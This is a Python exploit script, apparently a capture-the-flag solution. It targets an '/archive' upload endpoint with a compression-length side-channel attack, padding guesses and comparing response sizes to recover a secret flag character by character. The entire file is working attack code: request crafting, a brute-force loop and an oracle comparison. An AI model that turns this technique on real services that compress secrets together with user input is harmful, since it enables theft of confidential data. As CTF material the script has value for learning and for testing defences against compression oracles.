import time
import sys
import string
import requests
from pwn import cyclic


if 'LOCAL' in sys.argv:
    IP = '6.6.6.6'
else:
    IP = sys.argv[1]
PORT = 5001
URL = f"http://{IP}:{PORT}"

s = requests.Session()

#===========================================================
#                    EXPLOIT GOES HERE                     
#===========================================================

def archive(content):
    aim_url = f"http://{IP}:{PORT}/archive"
    
    boundary = '----WebKitFormBoundary' + 'absolutecinema'
    
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename="test.bin"\r\n'
        f'Content-Type: application/octet-stream\r\n\r\n'
    ).encode() + content + f'\r\n--{boundary}--\r\n'.encode()
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    try:
        res = s.post(aim_url, data=body, headers=headers)
        hex_content = bytes.fromhex(res.headers.get('Content', ''))
        return len(hex_content) 
    
    except Exception as e:
        print("Печаль-беда, горе-незадача", e)
        return None


CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_" + "}"
flag = b"vka{"

while not flag.endswith(b"}"):
    best_char = None
    
    for pad_len in range(1,5000):
        padding = bytearray(cyclic(length=pad_len, alphabet=range(128, 256), n=3))
        sizes = {}
        for c in CHARSET:
            sizes[c] = archive(padding + flag + c.encode() + b"#")
        sorted_sizes = sorted(sizes.items(), key=lambda x: x[1])
        print(sorted_sizes)

        if sorted_sizes[0][1] < sorted_sizes[1][1]:
            best_char = sorted_sizes[0][0]
            print(f"\npad={pad_len}: {best_char}")
            break
    
    if best_char:
        flag += best_char.encode()
    else:
        best_char = min(sizes, key=sizes.get)
        flag += best_char.encode()
    
    print(f"\n[+] {flag.decode()}")

print(f"\nFlag: {flag.decode()}")
